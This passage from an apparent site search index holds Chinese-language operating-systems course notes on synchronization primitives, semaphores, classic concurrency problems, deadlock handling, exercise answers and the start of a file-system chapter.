int new_val) {\n    int ret = *target;\n\n    // *target = (*target == expected) ? new_val : *target;\n    if (*target == expected) {\n        *target = new_val;\n    }\n\n    return ret;\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\u4e0a\u4e00\u4e2a <code>test_and_set(target)</code>\u200b \u5c31\u76f8\u5f53\u4e8e <code>compare_and_swap(target, false, true</code>\u200b</p> <p>atomic variable</p> <pre><code>void increment(atomic_int *v) {\n    int temp;\n    do {\n        temp = *v;\n    } while (temp != compare_and_swap(v, temp, temp+1));\n}\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u4f9d\u9760\u4e0a\u8ff0\u539f\u5b50\u6307\u4ee4\uff0c\u6765\u5b9e\u73b0\u539f\u5b50\u53d8\u91cf\uff0c\u5176\u4ee5\u6765\u539f\u5b50\u7684\u64cd\u4f5c\u6765\u7ef4\u6301\u81ea\u8eab\u7684\u72b6\u6001</p> <p>mutex</p> <pre><code>while (true) {\n    acquire();\n    /* critical section */\n    release();\n    /* remainder section */\n}\n\n/* ------- */\nvoid acquire() {\n    while (!available)\n        ; /* busy waiting */\n    avaliable = false;\n}\n\nvoid release() {\n    avaliable = true;\n}\n</code></pre> <p>\u4e0a\u8ff0\u662f\u4e92\u65a5\u9501\uff08mutex\uff09\u7684\u63cf\u8ff0\u7b97\u6cd5\uff0c\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u4e0a\u8ff0\u539f\u5b50\u6307\u4ee4\uff0c\u4e3a\u6211\u4eec\u5b9e\u73b0\u4e92\u65a5\u9501</p> <pre><code>void acquire() {\n    while (compare_and_swap(&amp;available, 1, 0) != 1)\n        ; /* busy waiting */\n}\n\nvoid release() {\n    available = true;\n}\n</code></pre> <p>\u4f46\u662f\u5728\u4e0a\u8ff0\u5b9e\u73b0\u4e2d\uff0c\u8be5\u4e92\u65a5\u9501\u5b9e\u73b0\u7684\u662f\u5fd9\u7b49\u5f85\uff0c\u8fd9\u7c7b\u4e92\u65a5\u9501\u53c8\u79f0\u4e3a spinlock</p> <p>\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u5982\u4e0b\u5b9e\u73b0\u6765\u89e3\u51b3\u5fd9\u7b49\u5f85\u95ee\u9898</p> <pre><code>void acquire() {\n    while (compare_and_swap(&amp;avaliable, 1, 0) != 1)\n        yield(); \n}\n\nvoid release() {\n    avaliable = true;\n}\n</code></pre> <p>\u4fe1\u53f7\u91cf</p> <pre><code>void wait(S) {\n    while (S &lt;= 0)\n        ;   /* busy waiting */\n    S--;\n}\n\nvoid signal(S) {\n    S++;\n}\n</code></pre> <ul> <li>counting semaphore</li> <li>binary semaphore</li> </ul> <p>\u5728\u738b\u9053\u4e2d\uff0c\u8fd8\u5c06\u5fd9\u7b49\u7684\u4fe1\u53f7\u91cf\u548c\u975e\u5fd9\u7b49\u7684\u4fe1\u53f7\u91cf\u505a\u4e86\u533a\u5206\uff0c\u4e0b\u9762\u662f\u975e\u5fd9\u7b49\u7684\u4fe1\u53f7\u91cf\uff0c\u7528\u4e86\u4e00\u4e2a\u7b49\u5f85\u961f\u5217</p> <pre><code>typedef struct {\n    int value;\n    struct list_head * waiting_queue;\n} semaphore; \n\nwait(semaphore *S) {\n    S-&gt;value--;\n    if (S-&gt;value &lt; 0) {\n        add this process to S-&gt;list;\n        block();\n    }\n}\nsignal(semaphore *S) {\n    S-&gt;value++;\n    if (S-&gt;value &lt;= 0) {\n        remove a process P from S-&gt;list;\n        wakeup(P);\n    }\n}\n</code></pre> <ul> <li>\u9519\u8bef\u5730\u4f7f\u7528\u4fe1\u53f7\u91cf\u4f1a\u5bfc\u81f4\u6b7b\u9501</li> <li>\u4fe1\u53f7\u91cf\u8fd8\u53ef\u4ee5\u5b9e\u73b0\u524d\u9a71\u5173\u7cfb</li> </ul> <p>**Priority inversion ***  </p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/OS/%E5%90%8C%E6%AD%A5%E5%92%8C%E6%AD%BB%E9%94%81/#22","title":"2.2 \u540c\u6b65\u95ee\u9898\u4f8b\u5b50","text":"<p>\u6211\u4eec\u4e00\u822c\u91c7\u7528\u4fe1\u53f7\u91cf\u673a\u5236\u6765\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\uff0c\u4fe1\u53f7\u91cf\u76f4\u63a5\u63cf\u8ff0\u8d44\u6e90\u7684\u6570\u91cf</p> <ul> <li>wait \u7b49\u5f85\u6709\u8d44\u6e90\uff0c\u5e76\u4e14\u53d6\u8d70\u4e00\u4e2a</li> <li>signal \u91ca\u653e\u4e00\u4e2a\u8d44\u6e90</li> </ul> <p>**The Bound-Buffer Problem ***</p> <p>\u8fd9\u4e2a\u95ee\u9898\u53c8\u79f0 Producer-Consumer Problem. Producer \u4f1a\u4ea7\u751fitem\u653e\u5230buffer\u4e2d\uff0c\u800cConsumer \u4f1abuffer\u4e2d\u62bd\u53d6item</p> <ul> <li>\u5f53 buffer \u4e3a\u7a7a\u65f6\uff0cConsumer\u9700\u8981\u7b49\u5f85</li> <li>\u5f53 buffer \u4e3a\u6ee1\u65f6\uff0cProducer\u9700\u8981\u7b49\u5f85</li> </ul> <p>\u6709\u591a\u79cd\u89e3\u51b3\u65b9\u6848 7 \u7ecf\u5178\u540c\u6b65\u95ee\u9898 - \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4</p> <pre><code>semaphore lock = 1;\nsemaphore eslot = BUFFER_SIZE;\nsemaphore fslot = 0;\n\nproducer() {\n    while (true) {\n        wait(eslot);    // if buffer is full, i.e. eslot == 0, wait\n                        // else, eslot--\n        wait(lock);\n        add_to_buffer(next_produced);\n        signal(lock);\n        signal(fslot);  // fslot++\n    }\n}\n\nconsumer() {\n    while (true) {\n        wait(fslot);    // if buffer is empty, i.e. fslot == 0, wait\n                        // else, fslot--\n        wait(lock);\n        next_consumed = take_from_buffer();\n        signal(lock);\n        signal(eslot);  // eslot++\n    }\n}\n</code></pre> <p>**The Readers-Writers Problem ***  </p> <p>\u6570\u636e\u5e93\u65b9\u9762\u7684\u95ee\u9898\uff0c\u6570\u636e\u5e93\u7684Write\u4e5f\u9700\u8981\u8bfb\uff0c\u6539\uff0c\u5199\u3002\u56e0\u6b64</p> <ul> <li>reader \u548c writer \u7684\u51b2\u7a81</li> <li>writer \u548c writer \u7684\u51b2\u7a81</li> </ul> <p>**Dining-Philosophers Problem ***</p> <pre><code>vector&lt;semaphore&gt; chopstick(5, 1);  // initialize semaphores to all 1\nsemaphore lock = 1;\n\nphilosopher(int index) {\n    while (true) {\n        wait(lock);\n        wait(chopstick[i]);\n        wait(chopstick[(i + 1) % 5]);\n        signal(lock);\n\n        eat();\n\n        signal(chopstick[i]);\n        signal(chopstick[(i + 1) % 5]);\n        think();\n    }\n}\n</code></pre> <p>Linux \u540c\u6b65 \u548c POSIX \u540c\u6b65</p>"},{"location":"ZJU-course/OS/%E5%90%8C%E6%AD%A5%E5%92%8C%E6%AD%BB%E9%94%81/#23-deadlock","title":"2.3 \u6b7b\u9501 Deadlock","text":"<p>\u6309\u7167\u8d44\u6e90\u4f7f\u7528\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u6211\u4eec\u5c06\u7cfb\u7edf\u7684\u884c\u4e3a\u89c6\u4e3a\u4e09\u4e2a\u90e8\u5206</p> <ul> <li>\u7533\u8bf7\u8d44\u6e90</li> <li>\u4f7f\u7528\u8d44\u6e90</li> <li>\u91ca\u653e\u8d44\u6e90</li> </ul> <p>\u5b58\u5728\u4e00\u4e9b\u8d44\u6e90\u662f\u6709\u9650\u4e14\u4e92\u65a5\u7684\uff0c\u5f53\u6211\u4eec\u9700\u8981\u7533\u8bf7\u8fd9\u4e9b\u8d44\u6e90\u7684\u65f6\u5019\u4f1a\u9677\u5165\u7b49\u5f85\uff0c\u82e5\u6070\u597d\u7b49\u5f85\u7684\u7a0b\u5e8f\u672c\u8eab\u4e5f\u62e5\u6709\u4e00\u4e9b\u8d44\u6e90\uff0c\u522b\u7684\u8fdb\u7a0b\u53c8\u5728\u7b49\u5f85\u5b83\uff0c\u5c31\u4f1a\u6b7b\u9501</p> <p>\u8d44\u6e90\u5206\u914d\u56fe</p> <ul> <li>\u8d44\u6e90</li> <li>\u8fdb\u7a0b / \u7ebf\u7a0b</li> <li>\u8d44\u6e90\u6307\u5411\u8fdb\u7a0b / \u7ebf\u7a0b \u8868\u793a\u8be5\u8d44\u6e90\u5206\u914d\u7ed9\u8be5\u8fdb\u7a0b / \u7ebf\u7a0b  Assignment Edge</li> <li>\u8fdb\u7a0b / \u7ebf\u7a0b \u6307\u5411\u8d44\u6e90\uff0c\u8868\u793a\u8be5\u8fdb\u7a0b / \u7ebf\u7a0b\u5728\u7b49\u5f85\u8be5\u8d44\u6e90 Request Edge</li> </ul> <p>\u200b\u200b</p> <p>\u5bf9\u4e8e\u8fd9\u6837\u7684\u56fe\uff0c\u6211\u4eec\u6709</p> <ul> <li>\u4e0d\u5b58\u5728\u73af -&gt; \u4e0d\u6b7b\u9501</li> <li>\u6b7b\u9501 -&gt; \u5b58\u5728\u73af</li> </ul> <p>\u4f46\u662f\u5b58\u5728\u73af\u4e0d\u4e00\u5b9a\u5bfc\u81f4\u6b7b\u9501\uff0c\u5982\u679c\u8bf4\u540c\u7c7b\u8d44\u6e90\u53ea\u6709\u4e00\u4e2a\uff0c\u90a3\u4e48\u6b7b\u9501\u548c\u6709\u73af\u5c31\u662f\u5145\u5206\u5fc5\u8981\u6761\u4ef6</p> <p>\u5b89\u5168\u72b6\u6001\u548c\u4e0d\u5b89\u5168\u72b6\u6001</p> <p>safe state \u662f\u4e00\u4e2a\u6bd4\u8f83\u5f3a\u7684\u72b6\u6001\uff0c\u662f\u6307\u7cfb\u7edf\u6309\u7167 safe sequence \u7684\u987a\u5e8f\u6267\u884c\u8fdb\u7a0b/\u7ebf\u7a0b\u548c\u5206\u914d\u8d44\u6e90\u3002\u4f46\u662f\u76f8\u5bf9\u5e94\u7684 unsafe state \u5e76\u4e0d\u662f\u6307\u4e00\u5b9a\u4f1a\u53d1\u751f\u6b7b\u9501</p> <ul> <li>\u4f55\u4e3asafe sequence\uff0c\u8fd9\u4e2a\u5e8f\u5217\u91cc\u7684\u8fdb\u7a0b\u6240\u9700\u7684\u8d44\u6e90\u90fd\u53ef\u4ee5\u901a\u8fc7\u73b0\u6709\u8d44\u6e90\u548c\u4e4b\u524d\u8fdb\u7a0b\u6267\u884c\u5b8c\u6bd5\u91ca\u653e\u7684\u8d44\u6e90\u6765\u6ee1\u8db3</li> </ul> <p>\u6b7b\u9501\u7684\u6761\u4ef6</p> <p>\u4ea7\u751f\u6b7b\u9501\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u56db\u4e2a\u6761\u4ef6</p> <ul> <li>mutual exclusion  \u6b7b\u9501\u5bf9\u5e94\u7684\u8d44\u6e90\u5fc5\u987b\u662f\u975e\u5171\u4eab\u7684\uff0c\u975e\u5171\u4eab\u624d\u9700\u8981\u7b49\u5f85</li> <li>hold &amp; wait \u6b7b\u9501\u5bf9\u5e94\u7684\u8fdb\u7a0b\u5fc5\u987b\u5728\u6301\u6709\u8d44\u6e90\u7684\u60c5\u51b5\u4e0b\u9677\u5165\u7b49\u5f85</li> <li>no preemption \u6b7b\u9501\u5bf9\u5e94\u7684\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u53ea\u80fd\u5728\u4f7f\u7528\u5b8c\u8d44\u6e90\u4e4b\u540e\u4e3b\u52a8\u91ca\u653e\uff0c\u800c\u4e0d\u80fd\u88ab\u5176\u4ed6\u8fdb\u7a0b\u62a2\u5360\u8d44\u6e90</li> <li>circular wait \u6b7b\u9501\u7684\u8fdb\u7a0b\u5b58\u5728\u73af\u72b6\u7684\u7b49\u5f85\u5173\u7cfb</li> </ul> <p>\u6b7b\u9501\u7684\u5904\u7406</p> <p>\u5904\u7406\u6b7b\u9501\u95ee\u9898\u6709\u4ee5\u4e0b\u51e0\u4e2a\u601d\u8def</p> <ul> <li>\u4e0d\u505a\u5904\u7406\uff0c\u4f9d\u9760\u7f16\u7a0b\u8005\u4fdd\u8bc1\u903b\u8f91\u4e0a\u4e0d\u6b7b\u9501\uff08\u5176\u5b9e\u8fd9\u4e2a\u662f\u6700\u5e38\u4f7f\u7528\uff09</li> <li>deadlock prevention \u901a\u8fc7\u4e00\u4e9b\u534f\u8bae\u548c\u89c4\u8303\u4fdd\u8bc1\u6b7b\u9501\u4e0d\u4f1a\u51fa\u73b0</li> <li> <p>deadlock avoidance \u7981\u6b62\u53ef\u80fd\u4ea7\u751f\u6b7b\u9501\u7684\u884c\u4e3a\u6267\u884c</p> </li> <li> <p>\u4e00\u4e2a\u662f\u51fa\u4e8e\u89c4\u8303\u7684\u884c\u4e3a\u90fd\u4e0d\u4f1a\u4ea7\u751f\u6b7b\u9501\uff0c\u4e00\u4e2a\u662f\u4f1a\u68c0\u67e5\u8be5\u884c\u4e3a\u662f\u4e0d\u662f\u4ea7\u751f\u6b7b\u9501\uff0c\u5e76\u4e14\u4e0d\u4e88\u4ee5\u6267\u884c</p> </li> <li>deadlock detection \u548c deadlock recovery \u5141\u8bb8\u6b7b\u9501\u7684\u51fa\u73b0\uff0c\u4f46\u662f\u53ef\u4ee5\u68c0\u6d4b\u5230\u5b83\uff0c\u5e76\u4e14\u89e3\u9664\u6b7b\u9501\u95ee\u9898</li> </ul> <p>\u6b7b\u9501\u9884\u9632</p> <p>\u5c31\u662f\u907f\u514d\u6b7b\u9501\u7684\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6\u5176\u4e2d\u4e4b\u4e00\u5373\u53ef</p> <ul> <li>\u7834\u574f mutual exclusion \u8fd9\u51e0\u4e4e\u662f\u67d0\u4e9b\u8d44\u6e90\u7684\u5929\u7136\u5c5e\u6027\uff0c\u57fa\u672c\u65e0\u6cd5\u907f\u514d</li> <li>\u7834\u574f hold &amp; wait \u6211\u4eec\u8ba9\u5176\u4e0d\u80fd\u7b49\u5f85\u5e76\u4e14\u88ab\u7b49\u5f85\uff0c\u8ba9\u5176\u5728\u7533\u8bf7\u8d44\u6e90\u7684\u65f6\u5019\u5b8c\u6210\u6240\u6709\u8d44\u6e90\u7684\u7533\u8bf7\uff0c\u5982\u679c\u6ca1\u6cd5\u4e00\u6b21\u6027\u83b7\u53d6\u7533\u8bf7\u8d44\u6e90\u5c31\u653e\u5f03\u8d44\u6e90</li> <li>\u7834\u574f no preemption \u8fd0\u884c\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u5f3a\u884c\u62a2\u5360\u53e6\u5916\u4e00\u4e2a\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u7684\u8d44\u6e90\uff0c\u53ef\u4ee5\u7834\u574f\u88ab\u52a8\u7684\u7b49\u5f85\u5173\u7cfb\uff08\u4f46\u662f\u5141\u8bb8\u62a2\u5360\u53ef\u80fd\u4f1a\u5bfc\u81f4\u9965\u997f\u95ee\u9898\uff09</li> <li>\u7834\u574f circular wait \u5c31\u662f\u6240\u8c13\u7684safe sequence \u5c31\u662f\u8bf4\u7ed9\u8d44\u6e90\u7f16\u53f7\uff0c\u89c4\u5b9a\u8fdb\u7a0b\u53ea\u80fd\u6309\u7167\u7279\u5b9a\u987a\u5e8f\u6765\u7533\u8bf7\u8d44\u6e90\uff0c\u5c31\u4e0d\u4f1a\u5faa\u73af\u7b49\u5f85\uff08\u96be\u4ee5\u8bbe\u8ba1\uff09</li> </ul> <p>**\u6b7b\u9501\u907f\u514d ***</p> <p>\u6709\u51e0\u79cd\u5e38\u89c1\u7b97\u6cd5\u6765\u68c0\u67e5\u6b7b\u9501</p> <ul> <li>\u8d44\u6e90\u5206\u914d\u56fe\u7b97\u6cd5 \u53ea\u9002\u7528\u4e8e\u201c\u6bcf\u4e2a\u8d44\u6e90\u7c7b\u522b\u90fd\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b\u7684\u60c5\u51b5\u201d</li> <li> <p>\u94f6\u884c\u5bb6\u7b97\u6cd5 \u5305\u542b\u5b89\u5168\u7b97\u6cd5\u548c\u8d44\u6e90\u8bf7\u6c42\u7b97\u6cd5</p> </li> <li> <p>\u7528 Available \u53bb\u6d88\u8017\u6389\u4e00\u4e2a Need \u7136\u540e\u83b7\u5f97\u5176\u91ca\u653e\u7684\u8d44\u6e90\uff0c\u518d\u53bb\u6d88\u8017\u6389\u4e0b\u4e00\u4e2a\uff0c\u770b\u770b\u80fd\u5426\u6d88\u8017\u5b8c</p> </li> </ul> <p>\u6b7b\u9501\u68c0\u6d4b</p> <p>\u5229\u7528\u8d44\u6e90\u5206\u914d\u56fe\uff0c\u4e00\u6b65\u6b65\u5904\u7406\u6389\u5404\u4e2a\u8fdb\u7a0b\uff0c\u770b\u770b\u80fd\u5426\u5316\u7b80\u5b8c\u6210</p> <ul> <li>\u5b9e\u73b0\u4e00\u4e2a\u7b49\u5f85\u56fe wait-for graph \u8fd9\u662f\u8d44\u6e90\u5206\u914d\u56fe\u7684\u4e00\u4e2a\u7b80\u5316\u6001\uff0c\u540c\u6837\u6709\u6bcf\u4e2a\u8d44\u6e90\u7c7b\u578b\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b\u7684\u5047\u8bbe\uff0c\u5b8c\u6210\u7b49\u5f85\u56fe\u4e4b\u540e\u5b9a\u671f\u68c0\u67e5\u662f\u5426\u6709\u73af\u5373\u53ef</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u6b7b\u9501\u89e3\u9664</p> <ul> <li>\u6740\u6b7b\u6240\u6709\u9677\u5165\u6b7b\u9501\u7684\u8fdb\u7a0b</li> <li>\u6309\u7167\u7279\u5b9a\u987a\u5e8f\u6740\u6b7b\u8fdb\u7a0b\uff0c\u76f4\u5230\u68c0\u6d4b\u51fa\u6765\u65e0\u6b7b\u9501</li> <li>\u56de\u6eda\u90e8\u5206\u8fdb\u7a0b\uff0c\u5e76\u4e14\u5f3a\u884c\u62a2\u5360\u5360\u6709\u7684\u8d44\u6e90</li> </ul>"},{"location":"ZJU-course/OS/%E5%90%8C%E6%AD%A5%E5%92%8C%E6%AD%BB%E9%94%81/#24","title":"2.4 \u4e60\u9898\u6536\u5f55","text":"<p>\u738b\u9053</p> <ul> <li>\u4fe1\u53f7\u91cf\u4e00\u822c\u5206\u4e3a \u4e92\u65a5\u91cf \u548c \u8d44\u6e90\u91cf \uff0c\u4e92\u65a5\u91cf\u7684\u521d\u59cb\u503c\u4e00\u822c\u4e3a1\uff0c\u53ef\u80fd\u5bf9\u5e94PPT\u4e2d\u7684 binary \u548c counting</li> <li>\u5f53\u8d44\u6e90\u91cf\u5c0f\u4e8e0\u7684\u65f6\u5019\uff0c\u8d44\u6e90\u91cf\u7684\u7edd\u5bf9\u503c\u8868\u793a\u5176\u5728\u7b49\u5f85\u7684\u8fdb\u7a0b\u6570\u91cf</li> <li>\u4e34\u754c\u533a Critical-Section \u662f\u4e00\u6bb5\u4ee3\u7801\u800c\u4e0d\u662f\u8d44\u6e90</li> <li>\u7531PV\u64cd\u4f5c\u5b9e\u73b0\u8fdb\u7a0b\u540c\u6b65\u65f6\uff0c\u4fe1\u53f7\u91cf\u7684\u521d\u59cb\u503c\u7531\u7528\u6237\u786e\u5b9a</li> <li>\u82e5\u7cfb\u7edf\u6709n\u4e2a\u8fdb\u7a0b\uff0cready queue \u91cc\u6700\u591a\u6709 n - 1 \u4e2a\u800c waiting queue \u91cc\u6700\u591a\u53ef\u4ee5\u6709 n \u4e2a</li> <li>Peterson \u7b97\u6cd5\u4e2d turn \u53d8\u91cf\u7684\u4f5c\u7528\u662f\u8868\u793a\u8f6e\u5230\u54ea\u4e2a\u7ebf\u7a0b\u8fdb\u5165\u4e34\u754c\u533a</li> <li>\u751f\u4ea7\u8005 \u6d88\u8d39\u8005\u95ee\u9898\u7528\u4e8e\u89e3\u51b3\u540c\u6b65\u548c\u4e92\u65a5\u7684\u95ee\u9898</li> <li>\u8fdb\u7a0b\u6570P\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u9700\u8981C\u4e2a\u8d44\u6e90\uff0c\u603b\u8d44\u6e90\u6570\u4e3aN\uff0c\u6ee1\u8db3 \\(P(C-1)&lt; N\\)\uff0c\u5c31\u4e00\u5b9a\u4e0d\u4f1a\u53d1\u751f\u6b7b\u9501</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662fB\uff0c\u78c1\u76d8\u5e76\u975e\u4e34\u754c\u8d44\u6e90</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662fD\uff0c\u4f46\u662f\u6211\u611f\u89c9\u5b83\u5728\u80e1\u8a00\u4e71\u8bed\uff0cmutex\u8fd8\u5c0f\u4e8e0\u7684\u60c5\u51b5\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5524\u9192\u8fdb\u7a0b</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>C</li> </ul> <p>\u200b\u200b</p> <ul> <li>D</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>B \u9650\u5236\u7528\u6237\u7533\u8bf7\u8d44\u6e90\u7684\u987a\u5e8f \u662f\u6b7b\u9501\u9884\u9632\u7684\u8bf4\u6cd5</li> </ul> <p>\u200b\u200b</p> <ul> <li>A</li> </ul> <p>\u200b\u200b</p> <ul> <li>D</li> </ul> <p>jjm\u4f5c\u4e1a\u9898</p> <p>\u200b\u200b</p> <ul> <li>\u8fd9\u9898\u7684\u7b2c\u4e09\u9898\u7740\u91cd\u770b\u4e00\u4e0b</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/OS/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","title":"\u6587\u4ef6\u7cfb\u7edf","text":"<ul> <li>\u6587\u4ef6\u7cfb\u7edf\u7684\u5f15\u5bfc\u533a\uff0c\u548c\u64cd\u4f5c\u7cfb\u7edf\u6574\u4f53\u7684\u542f\u52a8\u8fc7\u7a0b</li> </ul>"},{"location":"ZJU-course/OS/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#61","title":"6.1 \u6587\u4ef6","text":"<p>\u6587\u4ef6\u662f\u5b58\u50a8\u5728 \u4e8c\u7ea7\u4ecb\u8d28\uff08\u78c1\u76d8\uff09\u4e2d\uff0c\u5177\u540d\u7684\u4e00\u7cfb\u5217\u76f8\u5173\u4fe1\u606f\u96c6\u5408\u3002\u4e0d\u8bba\u662f\u7528\u6237\u8fd8\u662f\u7a0b\u5e8f\u90fd\u9700\u8981\u901a\u8fc7\u6587\u4ef6\u6765\u548c\u4e8c\u7ea7\u4ecb\u8d28\u8fdb\u884c\u4fe1\u606f\u4ea4\u6362</p> <p>\u4ece\u7528\u6237\u89d2\u5ea6\u800c\u8a00\uff0c\u6587\u4ef6\u662f\u903b\u8f91\u5916\u5b58\u7684\u6700\u5c0f\u5355\u5143\uff0c\u6211\u4eec\u53ea\u6709\u901a\u8fc7\u6587\u4ef6\u624d\u80fd\u8bfb\u5199\u5916\u5b58</p> <p>\u6587\u4ef6\u6709\u4e0d\u540c\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\u6570\u636e\u6587\u4ef6\u3001\u53ef\u6267\u884c\u6587\u4ef6\u7b49\u3002\u6570\u636e\u6587\u4ef6\u53c8\u53ef\u80fd\u662f numeric, alphabetic, alphanumeric, binary \u7684\u3002</p> <p>\u6587\u4ef6\u5c5e\u6027</p> <p>\u4e0d\u540c\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u4f1a\u7ed9\u6587\u4ef6\u8bbe\u7f6e\u4e0d\u540c\u7684\u5c5e\u6027\uff0c\u4e5f\u5c31\u662f\u6587\u4ef6\u7684meta data\uff0c\u4f46\u662f\u901a\u5e38\u6709\u4ee5\u4e0b\u51e0\u4e2a</p> <ul> <li>name\uff1a\u552f\u4e00\u7684\u4ee5 human - readable \u5f62\u5f0f\u4fdd\u5b58\u7684\u4fe1\u606f \u6587\u4ef6\u540d</li> <li>identifier\uff1a\u8ba9\u6587\u4ef6\u7cfb\u7edf\u6807\u5fd7\u4e00\u4e2a\u6587\u4ef6</li> <li>type\uff1a\u6709\u4e9b\u6587\u4ef6\u7cfb\u7edf\u6709\u4e0d\u540c\u7c7b\u578b\u7684\u6587\u4ef6\uff0c\u7528\u6b64\u533a\u5206</li> <li>location\uff1a\u6807\u8bb0\u6587\u4ef6\u5728\u54ea\u4e2a\u8bbe\u5907\uff0c\u54ea\u4e2a\u4f4d\u7f6e</li> <li>size\uff1a\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u6709\u65f6\u4e5f\u8868\u793a\u5176\u6700\u5927size</li> <li>protection\uff1a\u6587\u4ef6\u7684\u8bbf\u95ee\u63a7\u5236\u4fe1\u606f\uff0c\u8bfb/\u5199/\u6267\u884c \u6743\u9650</li> <li>timestamp\uff1a\u65f6\u95f4\u6233\uff0c\u4fdd\u5b58\u4e86\u521b\u5efa\u65f6\u95f4\uff0c\u4e0a\u6b21\u4fee\u6539\u65f6\u95f4\uff0c\u4e0a\u6b21\u4f7f\u7528\u65f6\u95f4\uff0c\u53ef\u4ee5\u505a\u4e00\u4e9b\u5b89\u5168\u4fdd\u62a4\u548c\u76d1\u63a7</li> <li>user indentification\uff1a\u7528\u6237\u8bb0\u5f55\uff0c\u4fdd\u5b58\u4e86\u521b\u5efa\u8005\uff0c\u4e0a\u6b21\u4fee\u6539\u8005\uff0c\u4e0a\u6b21\u8bbf\u95ee\u8005\uff0c\u53ef\u4ee5\u505a\u4e00\u4e9b\u5b89\u5168\u4fdd\u62a4\u548c\u76d1\u63a7</li> </ul> <p>\u6587\u4ef6\u7cfb\u7edf\u901a\u8fc7 FCB \u6765\u5b58\u653e\u63a7\u5236\u6587\u4ef6\u6240\u9700\u8981\u7684\u5404\u79cd\u4fe1\u606f\u7684\u6570\u636e\u7ed3\u6784\uff0cFCB\u90fd\u5b58\u50a8\u5728\u78c1\u76d8\u4e2d\uff0c\u5f53\u6587\u4ef6\u88ab\u6253\u5f00\u7684\u65f6\u5019\uff0c\u4f1a\u4ece\u78c1\u76d8\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d\u8fdb\u884c\u4f7f\u7528</p> <p>\u6587\u4ef6\u64cd\u4f5c</p> <p>OS\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\uff0c\u6765\u5b8c\u6210\u57fa\u672c\u7684\u6587\u4ef6\u64cd\u4f5c</p> <ul> <li>create\uff1a\u9996\u5148\u5728\u6587\u4ef6\u7cfb\u7edf\u4e3a\u6587\u4ef6\u5206\u914d\u4e00\u5757\u7a7a\u95f4\uff1b\u7136\u540e\u5728\u76ee\u5f55\u521b\u5efa\u5bf9\u5e94\u7684\u6761\u76ee</li> <li> <p>open / close\uff1a\u6253\u5f00\u6587\u4ef6\u83b7\u53d6\u6587\u4ef6\u53e5\u67c4 handle \uff0c\u968f\u540e\u5bf9\u4e8e\u6587\u4ef6\u7684\u64cd\u4f5c\u90fd\u9700\u8981\u901a\u8fc7\u8fd9\u4e2ahandle\u5b8c\u6210</p> </li> <li> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u6587\u4ef6\u6253\u5f00\u4e4b\u540e\u7531\u7528\u6237\u8d1f\u8d23\u5173\u95ed</p> </li> <li>\u6253\u5f00\u540e\u7684\u6587\u4ef6\u4f1a\u88ab\u52a0\u5165\u5230\u4e00\u4e2a\u6253\u5f00\u6587\u4ef6\u8868 open-file table \u4fdd\u5b58\u6240\u6709\u6253\u5f00\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u6587\u4ef6\u7684 \u53e5\u67c4\uff0c\u4f4d\u7f6e\uff0c\u8bbf\u95ee\u6743\u9650\u7b49\u7b49</li> <li>\u6587\u4ef6\u5f80\u5f80\u4f1a\u88ab\u591a\u4e2a \u7528\u6237 / \u8fdb\u7a0b / \u7ebf\u7a0b \u6253\u5f00\uff0c\u5f53\u6240\u6709\u7528\u6237\u90fd\u5173\u95ed\u6587\u4ef6\u4e4b\u540e\u624d\u5e94\u5f53\u5728open file table \u4e2d\u91ca\u653e\u6389\u8fd9\u4e2a\u6761\u76ee\uff0c\u6211\u4eec\u4f1a\u6709\u4e00\u4e2a count \u6765\u7ef4\u62a4\u5f53\u524d\u6587\u4ef6\u7684\u6253\u5f00\u72b6\u6001\uff0c\u6709\u70b9\u7c7b\u4f3c\u667a\u80fd\u6307\u9488</li> <li>read / write \u7ef4\u62a4\u4e00\u4e2a current-file-position pointer \u8fdb\u884c\u8bfb\u5199\uff0c\u5c31\u50cf\u56fe\u7075\u673a\u90a3\u6837</li> <li>repositioning within a file \uff0c\u5c31\u662fC\u8bed\u8a00\u4e2d\u7684seek\u64cd\u4f5c\uff0c\u91cd\u5b9a\u4f4d current-file-position pointer \u5230\u7ed9\u5b9a\u7684\u4f4d\u7f6e\uff08\u4f8b\u5982\u6587\u4ef6\u5f00\u5934\u548c\u7ed3\u5c3e\uff09</li> <li>delete \u5728 directory 